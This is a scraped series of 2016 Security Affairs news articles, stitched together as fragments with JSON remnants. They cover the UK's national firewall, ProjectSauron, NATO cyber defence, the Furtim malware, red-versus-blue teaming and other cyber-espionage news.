The infrastructure will protect government websites and national security agencies from hackers.\n\nThe national firewall would be used by government agencies and internet service providers to repel cyber threats.\n\n\u201cWhat better way of providing automated defences at scale than by the major private providers effectively blocking their customers from coming into contact with known malware and bad addresses?\u201d Martin said during his speech\n\nThe National Cyber Security Centre will start its activities next month, it represent of the pillars of the cyber strategy of the UK Government as announced last year by the former Chancellor Mr Osborne.\n\nOsborne also announced the plans of the Government to almost double the cybersecurity budget to \u00a31.9 billion for the years 2016 \u2013 2021.\n\nThe UK Government will also add 1,900 new professionals to the National intelligence agencies.\n\n\u201cIn the Spending Review, I have made a provision to almost double our investment to protect Britain from cyber attack and develop our sovereign capabilities in cyberspace, totalling \u00a31.9 billion over five years. If you add the spending on core cyber security capabilities government protecting our own networks and ensuring safe and secure online services, the government\u2019s total cyber spending will be more than \u00a33.2 billion.\u201d said Osborne.\n\nCyber security is crucial for any government, the number of \u201cnational security level cyber incidents\u201d in the last year is almost doubled, the intelligence agency now detects about 200 serious incidents every month aimed to disrupt national infrastructure and services.\n\nCyber attacks are asymmetric and instantaneous, difficult to repel without the aid of a new generation of tools.\n\nThe National Cyber Security Centre also has plans to design a new generation of automated defense systems to neutralise a large number of attacks having a low level of sophistication, such as phishing attacks spoofing government email addresses to target members of the public.\n\n\u201cWe trialled it, and whoever was sending 58,000 malicious emails per day from taxrefund@gov.uk isn\u2019t doing it anymore,\u201d added Martin.\n\n\n\nPierluigi Paganini\n\n(Security Affairs \u2013 GCHQ , National Cyber Security Centre)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gchq", "topic_name": "GCHQ"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/national-cyber-security-centre", "topic_name": "National Cyber Security Centre"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/national-firewall", "topic_name": "national firewall"}]}, {"news_name": "Colin Powell\u2019s emails leaked online.

It seems that the account is receiving small amounts of money (at about $990.00 a couple of days ago), but the real surprise is that some of the payments are coming from the seized Silk Road bitcoins and account.\n\n\n\nHey, wait a moment, the Silk Road Bitcoin are under the control of the FBI after the seizure of the popular black market.\n\nkrypt3ia decided to investigate the overall transactions and discovered that also the US Marshall service was involved in the transfers.\n\n\u201cSo, is this to say that these coins are still in the coffers of the feds and they are being sent to ShadowBrokers to chum the water here? Maybe get a conversation going? Maybe to get the bitcoins flying so others can trace some taint?

Levin told ZDNet that the payments being made through the scrutinized wallet are also going the other way.\n\nThe executive says the payment chain is likely due to spam, which means the US government may have nothing to do with the auction and this is simply the work of other individuals. Levin commented:\n\n\u201cIn Bitcoin, people like to send small payments to addresses, sometimes with embedded messages, sometimes without. Any famous address attracts a lot of spam.\n\nThe Silk Road seized coins and this auction are no exception.

Clarke, then Security Advisor the Clinton administration, took a quick flight from D.C. up to Cambridge, Massachusetts to meet with a team of hackers that would change forever, the way the US government looked at the world.\n\nClarke\u2019s contact in Cambridge was to be a hacker known as \u201cMudge.\u201d  Mudge was the mouthpiece for a hacker group known as the L0pht.  After about an hour of waiting patiently in a local bar, Clarke grew tired thinking Mudge got cold feet.  As he started to get up from the table, the gentle next to him introduced himself as Mudge, who had been sitting beside Clarke the whole time.  Not only was Mudge observing Clarke from afar, but so was the entire L0pht team: Brain Oblivion, tan, Kingpin, Weld Pond, Space Rogue, and Stefan Von Neuman, who later would drive right on through the gate of the NSA parking lot with nothing more than a salute!\n\nAfter small talk, Mudge took Clarke to \u201cthe L0pht\u201d, the second floor of a Cambridge warehouse where the L0pht team kludged and cobbled together an impressive arsenal of computing power capable of doing some serious damage if the team so desired.\n\nClarke left that night with more than an uneasy feeling.  Though not a cyber security person himself, he knew damn well that if a group of college students and geeks could dumpster dive enough equipment to be a serious threat, so could a nation-state actor!  Clarke invited L0pht to testify to Congress.  Though Congress was certainly concerned, little changed in the way Congress went about its business but for the Department of Defense, FBI, CIA, and especially the NSA, the situation couldn\u2019t have been bleaker \u2013 unfortunately, the prognosis has changed little.\n\nOver the past decade, the offensive capabilities of nation-state actors has grown exponentially.  China, Israel, and Russia all of whom have had robust offensive capabilities for years have become efficient and well manage espionage machines likely equal to that of the United States.  Other countries are quickly catching up: Syria, Iran, and a rabble of former Soviet States, have formidable offensive expertise.  It\u2019s not just governments either, hacking tools and techniques are becoming so ubiquitous it is nearly impossible for anyone to keep up.\n\nOf particular concern is the world\u2019s critical infrastructure. The last couple of years has been earmarked with attacks on power plants, distribution systems, and even water treatment facilities.  More recently, a report surfaced that the world\u2019s Global Positioning System (GPS), the space-based navigational system the world\u2019s relies on is now at risk of illegal jamming.\n\nInformation Warfare (Source Akamai)\n\nExperts have warned for years the GPS system is vulnerable to attack not just to jamming but to spoofing as well \u2013 though encryption is provided for the military\u2019s use only.  Great, but it won\u2019t help the wave of new and next generation devices that will be part of the so-called Internet of Things (IOT).\n\nThe everyday devices that power our lives will soon be connected to the Internet \u2013 refrigerators, dish washers, in-home camera systems, and even the watering bowl for your dog will be connected to the web where Fido\u2019s water can be refreshed by simply tapping an app on your cellphone.  So who cares is a hacker gets my carpet wet?  It\u2019s a fair question, but if a hacker can exploit the insecure code on the dog\u2019s watering bowl, it likely will act as a portal to more important areas of our life, like our bank accounts!\n\nThe real takeaway from the GPS jamming device and precisely what worried Richard Clarke on that fateful night in Cambridge, was the reality that offensive capabilities were being wrestled out of the realm, and control, of the spooks and the military. Simple jamming techniques have been used to disable key fobs, popular in today\u2019s new automobiles.  On a larger scale, jamming devices were used to steal a truck full of pharmaceuticals in Florida.   Even the North Koreans are in on the act, recently jamming the GPS of about 280 South Korean vessels.\n\nOn a larger scale, jamming devices were used to steal a truck full of pharmaceuticals in Florida.

In fact, they should be applauded for taking the risk of going to D.C. in the first place, particularly in the late nineties where computer geeks were just that \u2013 geeks!  Perhaps the team\u2019s biggest contribution is killing the myth that only a well-funded government can wreak havoc; clearly, not true.  Mudge knew it, Clarke knew it, and now we\u2019re all waking up to this new reality.\n\nMudge knew it, Clarke knew it, and now we\u2019re all waking up to this new reality.\n\nWritten by: Rick Gamache\n\nRick Gamache is a freelance writer with 25 years\u2019 experience in the cyber security field.

Remsec is a stealthy tool that appears to be primarily designed for spying purposes. Its code contains a reference to Sauron, the all-seeing antagonist in Lord of the Rings.\u201d Symantec researchers explained in a blog post.\n\n\n\n\u201cStrider is capable of creating custom malware tools and has operated below the radar for at least five years,\u201d added Symantec. \u201cBased on the espionage capabilities of its malware and the nature of its known targets, it is possible that the group is a nation-state level attacker.\u201d\n\nExperts from Kaspersky Lab published a detailed analysis on the APT group that they called ProjectSauron.\n\n\u201cWhat differentiates a truly advanced threat actor from a wannabe APT? Here are a few features that characterize the \u2018top\u2019 cyberespionage groups:\n\nProjectSauron easily covers many of these points.\u201d wrote Kaspersky in a blog post.\n\nKaspersky had discovered 30 organizations infected by the ProjectSauron in Russia, Iran, and Rwanda. The experts from Kaspersky also speculate the presence of victims in Italian-speaking countries.\n\nThe list of targets includes government agencies, military entities, scientific research centers, telecoms providers and financial institutions.\n\nSymantec has found evidence of the largest number of Strider\u2019s infections, it discovered 36 computers belonging to seven differed organizations since October 2011.\n\nThe analysis published by Symantec revealed that one of Strider\u2019s victims had previously been infected by the Regin espionage malware. Strider\u2019s attacks have tentative links with the Flamer APT group that targeted organizations in the Middle East.\n\n\u201cStrider\u2019s attacks have tentative links with a previously uncovered group, Flamer. The use of Lua modules, which we\u2019ll discuss later, is a technique that has previously been used by Flamer. One of Strider\u2019s targets had also previously been infected by Regin.\u201d\n\nThe experts from Kaspersky highlighted the abilities of the ProjectSauron group that made hard the detection and attribution by customizing artifacts in each target.\n\n\u201cThe actor behind ProjectSauron has a high interest in communication encryption software widely used by targeted governmental organizations,\u201d noted Kaspersky Lab in the report. \u201cIt steals encryption keys, configuration files, and IP addresses of the key infrastructure servers related to the encryption software.\u201d\n\nThe security experts haven\u2019t found evidence of the exploitation of zero-day vulnerabilities, but they don\u2019t exclude that the ProjectSauron has 0-zero Day-Exploit in his arsenal.\n\n\u201cEven the diversity of ISPs selected for ProjectSauron operations makes it clear that the actor did everything possible to avoid creating patterns.\u201d said Kaspersky experts.\n\nFor further details give a look to the detailed reports published by Symantec and Kaspersky Lab.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 ProjectSauron, Strider)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/projectsauron", "topic_name": "ProjectSauron"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/regin", "topic_name": "Regin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/strider", "topic_name": "Strider"}]}, {"news_name": "Cyberwar \u2013 The cyberspace is already a dangerous battlefield", "news_link": "https://securityaffairs.co/wordpress/50059/cyber-warfare-2/cyberwar-cyberspace.html", "title": "Cyberwar \u2013 The cyberspace is already a dangerous battlefield\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 6, 2016", "body": "The recent hacks of the Democratic National Committee and presidential candidate Hillary Clinton\u2019s campaign and the alleged infections spotted by the Russian FSB inside government networks demonstrate the intense activity in the cyberspace.\n\nIt is a virtual space crowded of nation-state actors and other threat actors that are threatening the security of Governments worldwide, and the situation is likely to get much worse.\n\nAt the recent NATO Warsaw Summit in July, the Alliance recognised the cyberspace as \u201ca domain of operations in which Nato must defend itself as effectively as it does in the air, on land, and at sea\u201d.\n\nKenneth Geers, a senior research scientist with security firm Comodo, speaking at the BlackHat USA security conference declared that the cyberwar is a real and present danger.\n\n\u201cThere is no question cyberwar exists,\u201d he says. \u201cWhether it rises to the level of weapons of mass disruption is another question. We don\u2019t have a decisive answer yet.\u201d\n\nI don\u2019t like the term \u2018cyberwar\u2019, I always use the term Information Warfare, but it is clear that the usage in the media of the word cyberwar intends to emphasize and strengthen the concept of inter-state conflict.\n\nGeers is a great cyber security expert, he has been working with the NATO, monitoring cyber dispute in the Ukraine.\n\nSpreading a malware like Stuxnet that could hit critical infrastructure is considered an act of war.\n\nWhen dealing with examples of acts of cyberwar, experts cite the attack against the Estonia in 2007, when the country systems were hit by a huge distributed denial of service attack.\n\nThe Estonia case raises another problem when approaching information warfare, the \u201cattribution\u201d of the attack. Despite the attack has been linked to the Russian government, the source was not officially confirmed.\n\nSomething of similar happened across the last years in Crimea where cyber armies linked to the Kremlin targeted the critical infrastructure of the area such as communications.\n\nThe tension in the real world between Russia and Crimea has a corresponding conflict in cyberspace. Numerous attacks were registering on both sides during the revolution in Kiev, and the cyber offensives have had an escalation after the approval of the Russian parliament for military use in the Crimea. The decision of the Russian government has triggered a series of events in cyber space as state-sponsored cyber units, groups of hacktivists, and cyber criminals started their campaigns against the enemies.\n\nUkraine\u2019s mobile phone infrastructure was under attack, the offensive against the Ukraine\u2019s mobile phone infrastructure originated in Crimea and is interfering with the phones of members of the parliament.\n\n\u201cI confirm that an IP-telephonic attack is under way on the mobile phones of members of Ukrainian parliament for the second day in a row,\u201d declared Valentyn Valentyn Nalivaichenk, the head of Ukraine\u2019s SBU security service during a press conference, according the Reuters agency.\n\nUkraine\u2019s telecommunications system has come under attack. The attackers used equipment installed within Ukrtelecom networks in the Crimea region under the control of Russian forces. This circumstance has raised tension between the two countries, and although the majority of the Crimean population is pro-Russian, the sabotage was interpreted by the government of Kiev as an intolerable act of war.\n\n\n\nThe last clamorous act of the dispute occurred in December 2015, when hackers shut down three power plants in Ukraine, plunging more than 200,000 citizens into darkness.\n\nThe Information warfare is evolving over the time, the surface of attack of every country is enlarging due to the massive penetration of technology. The effects of a cyber attack today could be dramatic compared to the ones observed in Estonia in 2007.\n\n\u201cToday\u2019s tanks, planes and ships are really just rolling, flying and floating computers,\u201d Geers says. \u201cIf you\u2019re a tank commander and the enemy launches a zero-day attack against an application you\u2019re depending on, you may not win on the battlefield that day.\u201d\n\nLet me add also that a cyber attack could have also serious economic and diplomatic consequences.\n\nBack to the US elections hack, Geers expressed his opinion on the alleged involvement of Russian state-sponsored hackers.\n\n\u201cCould the US elections be hacked by the Russians, just as Ukraine\u2019s was?\u201d  \u201cAbsolutely, says Geers.\u201d reported The Guardian that reported the Geers declaration.\n\n\u201cBut they could probably change the election more easily by doing influence operations in the runup to the election,\u201d he adds. \u201cMaybe doxxing is the best way to do that. You\u2019re embarrassing the hell out of somebody. Lives are ruined.\u201d\n\nWe have no time, cyber security is a top priority for any government to avoid severe incidents in the next future.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyberwar, Information warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyberspace", "topic_name": "cyberspace"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwar", "topic_name": "cyberwar"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nation-state-hacker", "topic_name": "nation-state hacker"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato-warsaw-summit", "topic_name": "NATO Warsaw Summit"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/predidential-elenction", "topic_name": "Predidential Elenction"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}]}, {"news_name": "DCCC website redirected donors to a fake contribution page", "news_link": "https://securityaffairs.co/wordpress/49827/cyber-warfare-2/dccc-hacked.html", "title": "DCCC website redirected donors to a fake contribution page\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 30, 2016", "body": "The Democratic Party organization continues to be under attack, this time, the Democratic Party\u2019s congressional fundraising committee was hit by hackers.\n\nAccording to the Reuters, the FBI is investigating a security breach of the systems of the Democratic Congressional Campaign Committee (DCCC).\n\n\u201cThe FBI is investigating a cyber attack against another U.S. Democratic Party group, which may be related to an earlier hack against the Democratic National Committee, four people familiar with the matter told Reuters.\u201d states the Reuters. \u201cThe newly disclosed breach at the DCCC may have been intended to gather information about donors, rather than to steal money, the sources said on Thursday.\u201d\n\nIt is not clear which information have been accessed by hackers, it is likely they accessed donors\u2019 data including names, email addresses, and credit card details.\n\n\n\nAt the time I was writing, it is known that visitors to the DCCC  website were redirected to a bogus website mimicking the legitimate DCCC donation page.\n\n\u201cThat was when a bogus website was registered with a name closely resembling that of a main donation site connected to the DCCC.

2016", "body": "Whenever we discuss Information Security from a defensive point of view, we are inclined to think about protection, damage control, and reaction.\n\nHowever, adopting an attacker\u2019s mindset can effectively help businesses enhance their chances of securing themselves against ever-changing threats.\n\nIn military jargon, the term Red Team is traditionally used to identify highly skilled and organized groups acting as fictitious rivals and/or enemies to the \u201cregular\u201d forces, the Blue Team.\n\nBasically, the Red Team relied on its own expertise to explore any possible way to plan and carry out an attack \u2013 thus trying to espouse the standpoint, the attitude of potential assailants.\n\nSuch simulations aimed at both reproducing a real emergency and improving the troops\u2019 ability to fend off an aggression.\n\nAt the same time, Blue Team members were trained and expected to detect, to oppose and to weaken the Red Team\u2019s efforts.\n\nAll of these concepts have been given a peculiar status in the Cybersecurity field, as well: in this case, the Red Team\u2019s hostile activities take the form of sophisticated penetration tests, whose results constitute a reliable assessment of a business/organization\u2019s defensive capabilities and its safety status.\n\nGenerally speaking, the Red Team is given a very specific task \u2013 for example, evaluating the possibility of accessing sensitive data stored in a database.\n\nIn such a scenario, the group would have to act as an external threat actor, by recognizing any opportunity to exploit bugs and weaknesses of the infrastructure, the target being the extraction of the required pieces of information.\n\nMeanwhile, the Blue Team would be in charge of any defensive step.\n\nThe Red Team is supposed to both identify any vulnerability in the PPT (People, Process and Technology) defensive system and help the organization improve its own defensive abilities.\n\nWhile the Red Team\u2019s role is usually well-defined, the Blue Team\u2019s (and hence, the SOC analysts and response handlers\u2018) task is mutable, it is not known a priori: therefore, the former\u2019s simulated assaults are expected to test and enhance the latter\u2019s skills, igniting a virtuous circle.\n\nThe Blue Team\u2019s work routine includes accessing log data, using a SIEM, garnering threat intelligence information, performing traffic and data flow analysis; we may compare their mission to finding the well-known needle in the haystack\u2026\n\nOn the other hand, Red Team members have to be aware of any potential opponent\u2019s TTP (Tactics, Techniques, Procedures), which the Blue Team is expected to detect and counter.\n\nWhile automation can prove to be useful at this stage, the Blue Team shouldn\u2019t rely on technology alone: on both sides, human intuition, expertise and cleverness cannot be replaced (yet) \u2013 social engineering techniques (i.e. Spear phishing) being a strong reminder of this.\n\nLet\u2019s go back to our simulated data theft \u2013 in such a situation, Red Team members would have to act as relentless cyber criminals. A first step might be targeting a final user\u2019s PC, thus getting useful credentials for gathering information from within the network. This could lead to an attempted privilege escalation, aimed at seeking privileged credentials which might grant access to the central database. Should said database be accessed, the effective data exfiltration could take place, usually via a network connection to the outside, to the Web.\n\nThe Blue Team should be able to notice such efforts, the lateral movements, and any typical step of the so-called kill chain as early as possible \u2013 basically, it ought to oppose the attack and prevent the Red Team from reaching its goal.\n\nWhile this short overview might make the Team\u2019s tasks look quite simple, this is not the case.\n\nRed Team vs Blue Team \u2013 what makes their confrontation successful?\n\nAs we have seen, both teams have to accomplish complex tasks \u2013 but what makes their activities effective?\n\nA crucial element for the Red Team\u2019s success is its ability to espouse an aggressive mindset, a true hacker\u2018s point of view. Therefore, its members shouldn\u2019t be chosen among those who have contributed (or are still contributing) to defending the business\u2019s infrastructure, as it would produce a patent conflict of interest which could stifle a genuine hostile effort and a fair security assessment.\n\nAn \u201coutsider mindset\u201d is needed, and this necessity can be better addressed by relying on either external assistance or uninvolved personnel.\n\nA real assailant is going to overlook any rule, etiquette and ethical issue (he/she may be a terrorist, a criminal, or even a resentful former employee) \u2013 adopting such a mentality may be difficult.\n\nIn some cases, the confrontation between the teams starts as a pure abstract exercise, in a meeting room; however, this should just be the beginning \u2013 a real test entails real attacks, which cannot overlook the organization\u2019s physical security.\n\nTruth be told, reproducing a real-life scenario isn\u2019t always an option \u2013 for example, a serious assault on critical locations and infrastructures might result in irreparable damage or even in human losses.\n\nHowever, whenever possible, actual tests ought to be considered, and they should also focus on the weakest spot in the security system \u2013 human beings (i.e., the employees).\n\nThe Red Team may have the chance of observing the employees\u2019 response to some given inputs \u2013 malicious e-mail attachments, a \u201cstrange\u201d USB drive left in the HQ facilities (parking or restroom).given inputs \u2013 malicious e-mail attachments, a \u201cstrange\u201d USB drive left in the HQ facilities (parking or restroom).\n\nIf the company has already issued its own security policy, the Red Team\u2019s efforts will be able to assess the employees\u2019 knowledge, awareness and discipline of it, and also the business\u2019s capability of enforcing the rules.\n\nWhile the employees\u2019 physical security and behavior must not be neglected, wireless networks compose another battlefield which deserves the utmost attention.\n\nThe migration from wired to Wi-Fi networks has been transparent and plain, despite the need for a distinct, specific security approach to each solution.\n\nOne of the most serious threats to wireless network is the so-called Wardriving, which paves the way for following malicious and exploitative activities.\n\nCooperation, Mutual Feedback and Continuous Improvement\n\nThe usefulness of the Red Team vs Blue Team approach lies in interaction and mutual feedback, in its ability to turn the challenge into a way to ameliorate an organization\u2019s capability of detecting and counter threats.\n\nSuch a cooperation should strive for continuous improvement, the Blue Team should see the Red Team\u2019s activities as an opportunity to understand potential assailant\u2019s tactics, techniques, and procedures.\n\nWhile a SOC\u2019s failure to notice a breach may depend on its staff members\u2019 shortcomings, it may also be the outcome of inadequate measures against really refined or even previously unknown methods.\n\nThe Red Team attack can expose these weaknesses before real criminals may take advantage of them. As each team has different purposes, their means will be different, too.\n\nThe Red Team is expected to master the use of offensive tools (for example, Meterpreter or Metasploit), to know what a SQL injection is, to employ network scanning tools (Nmap), to use scripting languages, to recognize router and firewall commands, etc.\n\nOn the other hand, the Blue Team is supposed to understand any single phase of an Incident Response, to master its own share of tools and languages, to notice suspicious traffic patterns, to identify the Indicators of Compromise, to use an IDS properly, to carry out analyses and forensic  testing on different Operating Systems.\n\n\n\nA New Color on the Horizon\n\nSince each team strives to reach its own goals \u2013 and, when defined, its own KPIs \u2013 having the two of them work synergically is not an easy task.\n\nHowever, the ultimate aim is helping the business attain a higher level of security; therefore, a new Team \u2013 more correctly, a new \u201cfunction\u201d has been getting more and more attention.\n\nThis new actor, the \u201cPurple Team\u201d, would have to maximize and guarantee the effectiveness of the \u201ctraditional\u201d groups\u2019 activity, by combining the Blue Team\u2019s defensive routine with the weaknesses exposed by the Red Team, thus producing coherent efforts aiming at maximizing the results and common, business-led KPIs and metrics\n\nReferences:\n\nhttp://redteams.net/blog/2013/what-is-a-red-team\n\nhttps://www.army.mil/aps/09/information_papers/red_team_education.html\n\nhttp://www.scmagazineuk.com/how-your-red-team-penetration-testers-can-help-improve-your-blue-team/article/431023/\n\nhttp://blog.airbuscybersecurity.com/post/2014/11/APT-Kill-chain-Part-5-%3A-Access-Strenghtening-and-lateral-movements\n\nhttps://www.cybrary.it/2015/02/red-team-vs-blue-team-review/\n\nhttps://danielmiessler.com/study/red-blue-purple-teams/\n\nhttps://www.rsaconference.com/writable/presentations/file_upload/air-w02-the-rise-of-the-purple-team.pdf\n\nWritten by: Luigi Cristiani  (@gigicristiani)\n\nICT Security and Network Specialist\n\n \n\n \n\nPierluigi Paganini\n\n(Security Affairs \u2013 Red Team, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/blue-team", "topic_name": "Blue Team"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/red-team", "topic_name": "Red Team"}]}, {"news_name": "Furtim\u2019s advance capabilities and the Energy Sector", "news_link": "https://securityaffairs.co/wordpress/49378/breaking-news/furtim-energy-sector.html", "title": "Furtim\u2019s advance capabilities and the Energy Sector\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 15, 2016", "body": "In May of this year, security researcher Yotam Gottesam with enSilo, began unraveling a mystery that continues to unravel. First reported by FireF0X, a self-proclaimed \u201cex-malware analyst\u201d located in the Russian Federation, the Furtim malware dropper, or \u201cStealth\u201d in Latin, created a stir the security community over the lengths at which the creators of the malware went to avoid being detected.  It\u2019s not clear where FireF0X received the sample of malware and despite Yotam\u2019s thorough investigation outlined in his original blog post, many questions about Furtim have gone unanswered until now.\n\nJoseph Landry and Udi Shamir, researchers with SentinelOne, have begun putting more pieces of the puzzle together.  In a blog by the two that recently appeared on the SentinelOne website, Landry and Shamir outline a number of advanced capabilities built into the malware that makes the Furtim dropper a potent weapon against the energy sector.   The two believe the malware is likely a dropper tool and is being used very selectively against those in the energy sector.  The exploit itself appears to be effective against all variants of Microsoft Windows and bypasses antivirus solutions, next-generation firewalls, and endpoint solutions leveraging sandboxing techniques.\n\nFurtim \u2019s additional capabilities may give more insight on whose behind the malware and what their intentions are.  In addition to exploiting the network, Furtim looks to see if it access control systems are present on the workstation, but not just any access control system, the ZKTeco\u2019s ZKAccess software.  If that specific piece of software is present, Furtim will cease to execute.  The painstaking specifics of who and what to infect don\u2019t end there!\n\nUsing cmd.exe, Furtim cleverly disguises itself as normal process on the system.  Once started, the malware does an extensive reconnaissance of the machine, enumerating a wide variety of system parameters with an ability to terminate execution immediately if certain conditions exist.\n\nBy exploiting CVE-2014-4113 and CVE-2015-1701, the payload bypasses Windows UAC to gain administrative privileges on its target.  Now the malware\u2019s heavy lifting begins.\n\n\u201cThis sample was written in a manner to evade static and behavioral detection. Many anti-sandboxing techniques are utilized. Analysts relying solely on sandbox solutions may miss the full functionality of the sample.\u201d reported the analysis published by SentinelOne. \u201cTwo known exploits (CVE-2014-4113 and CVE-2015-1701) were found in the sample, as well as one UAC bypass.\u201d\n\nSentinelOne has outlined the exhaustive number of checks to obfuscate its presence on a host machine.  You can read the full details here.  The first check is for sandboxing and virtual machines to thwart the prying eyes of malware analysts.  If those are found, the malware terminates and its .data section is encrypted.  Antivirus is both enabled and disabled at appropriate times to further reduce the possibility of detection.\n\n\n\nThe malware has other interesting characteristics worth noting. For example, DLL hooking.  DLL hooking is a common practice used by antivirus products to detect malicious behavior.  Furtim will search for injected DLLs on the victims\u2019 workstation.  If an antivirus leveraging hooking is discovered, the result is stored for future use reference to suppress future functionality that may be introduced into the malware.  The DLL vendor list is short and somewhat varied.  BitDefender, BullGuard, COMODO, Agnitum, Qurb, and Emisoft make up that list.  A second DLL hooking routine is also ran by the malware discovering software used in manual malware analysis.  Additional checks also include hard disks for vendor specific virtualized hard disks such as VMware and BIOS checks for further virtualization identification.\n\nWith all the specific exceptions that the Furtim dropper tool includes, it leads one to wonder if specific targeting can be derived from its attributes. SentinelOne has been reluctant to point fingers as to who is behind the malware.  When pressed on the topic by SecurityWeek, SentinelOne would only describe Furtim \u2019s sophistication or methodology as \u201cimpressive.\u201d\n\nIt is likely that the resources required to research, write, and perfect the Furtim dropper point to a nation state level threat actor group but with recent rumblings from the security community about attribution it may be wise to stick with the knowns and let the analysts decide.\n\nAccording to SentinelOne Furtim was discovered targeting at least one European energy company.  This should come as no surprise considering attacks on the energy sector are becoming more and more prevalent across the industry.  Interestingly, in the previous analysis performed by Yotam Gottesman revealed encrypted information about its target being sent to a Russian-domain whose domain resolves to a number of Ukrainian IP addresses.  But as Yotam points out, you can never be certain that this is a true connection to any particular region or a ruse to throw off malware analysts.\n\nWritten by: Rick Gamache\n\nRick Gamache is a freelance writer with 25 years\u2019 experience in the cyber security field.

The details of the operation are described in a set of top secret documents published by the Der Spiegel magazine.\n\nChinese hackers have allegedly stolen as much as 50 terabytes of data from the US Defense contractors, including the details of the fighter\u2019s radar systems, engine schematics, \u201caft deck heating contour maps,\u201d designs to cool exhaust gasses and the method the jet uses to track targets.\n\nAccording to a US criminal complaint, in 2014 computers of Boeing and other military contractors have been hacked to steal intellectual property and trade secrets on transport aircraft. The attacks against Boeing likely occurred between Jan 14th and March 20th, 2010. Hackers compromised Boeing computer networks for a year for cyber espionage, they have also compromised systems of the principal US Defense contractors.\n\nSu Bin was a Chinese businessman residing in Canada, according to prosecutors he supported two countrymen in the organization of cyber attacks on Boeing systems.\n\nIn one of the emails sent by Bin, the man explained that stolen data would help China \u201cstand easily on the giant\u2019s shoulders\u201d.\n\n\n\nThe National Security Assistant Attorney General John P. Carlin announced the sentencing with Central District of California attorney Eileen M.

Well, thankfully, today, such arms race are not so prevalent. Or are they?\n\nIn a recent Warsaw Summit held by NATO , between 8th \u2013 9th July, 2016,  among many issues a Cyber Defence Pledge was issued. In their press release of 8h July discussing the points of this Pledge.\n\n\n\nThe cyberspace has become a huge layer for threat in recent years with much of the economy, administration, society, communications and other crucial infrastructure being dependent on ICT systems for the efficient functioning. A few years ago, cyber-attacks would be more against financial institutions and surveillance was just someone stalking your social media, though the NSA showed us how to be the creepiest stalker of all times. But today, in the age of Cyber-warfare, tools can disrupt, damage and destroy any Government\u2019s decision-making and protective capabilities.\n\nJust two years ago, NATO website was affected by a cyber attack which blocked it. The huge amount of attack on German stateside computers, the attack against Ukraine power plants, the Stuxnet which was aimed at nuclear power plants, the propagation of radical ideologies through internet to carry out bombings and terrorism or mass surveillance of critical infrastructure are just a few examples of the size of the threats and the implications they could have on state security.\n\nThus, to defend against such cyber-attacks, NATO has decided to work towards a cooperative Cyber Defence where detection, analysis, prediction, strengthening and information sharing through real time \u201cMalware Information Sharing Platform\u201d  would jointly help towards better security. NATO\u2019s Rapid Response Teams, Cyber Threat Assessment Cell and other expert bodies are ready to make a citizen\u2019s in NATO allied countries cyber-safe.\n\nHaving signed the Technical Arrangement on cyber defence with European Union in February,2016 and intensifying industry cooperation through the NATO Industry Cyber Partnership , the bold steps seem towards solidifying and making cyber resilience and firm model. The experts in the Cyber Defence Committee who are subordinate to the North Atlantic Committee for governance, policy and oversight seems to have privacy in mind.

The cyber defence of the alliance will continue to be integrated into operational planning and its operations and missions\n\n\u201cCyber attacks present a clear challenge to the security of the Alliance and could be as harmful to modern societies as a conventional attack.  We agreed in Wales that cyber defence is part of NATO\u2019s core task of collective defence.  Now, in Warsaw, we reaffirm NATO\u2019s defensive mandate, and recognise cyberspace as a domain of operations in which NATO must defend itself as effectively as it does in the air, on land, and at sea.  This will improve NATO\u2019s ability to protect and conduct operations across these domains and maintain our freedom of action and decision, in all circumstances.\u201d states the Warsaw Summit Communiqu\u00e9. \u201cWe continue to implement NATO\u2019s Enhanced Policy on Cyber Defence and strengthen NATO\u2019s cyber defence capabilities, benefiting from the latest cutting edge technologies.\u201d\n\n\n\nEach Ally is committed to improving its resilience to cyber attacks and the ability to promptly respond to cyber attacks, including in hybrid contexts. The Alliance aims to expand the scope of the NATO Cyber Range to allow allies in improving cyber capabilities and information sharing on threat and best practices.\n\n\u201cTogether with the continuous adaptation of NATO\u2019s cyber defence capabilities, this will reinforce the Alliance\u2019s cyber defence.  We are expanding the capabilities and scope of the NATO Cyber Range, where Allies can build skills, enhance expertise, and exchange best practices.  We remain committed to close bilateral and multilateral cyber defence cooperation, including on information sharing and situational awareness, education, training, and exercises.\u201d continues the statement.\n\nThe NATO intends to deepen cooperation with the EU who recently passed the new NIS directive that establishes minimum requirements for cyber-security on critical infrastructure operators.\n\nIf the 